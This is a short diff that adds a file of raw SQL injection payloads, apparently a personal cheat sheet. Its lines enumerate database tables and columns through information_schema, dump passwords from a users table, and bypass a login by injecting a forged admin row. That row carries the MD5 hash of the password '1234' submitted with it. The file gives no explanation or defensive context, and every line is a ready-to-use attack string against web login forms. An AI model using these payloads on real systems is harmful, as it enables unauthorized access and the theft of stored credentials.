@@ -1,0 +1,5 @@
+'UNION ALL SELECT table_name,1,1 FROM information_schema.tables
+'UNION ALL SELECT column_name,1,1 FROM information_schema.columns where table_name='users
+'UNION ALL SELECT password,id,login FROM users#
+Password : 1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+login=admin' AND 1=0 UNION ALL SELECT 1 ,'admin', '81dc9bdb52d04dc20036dbd8313ed055' #&password=1234
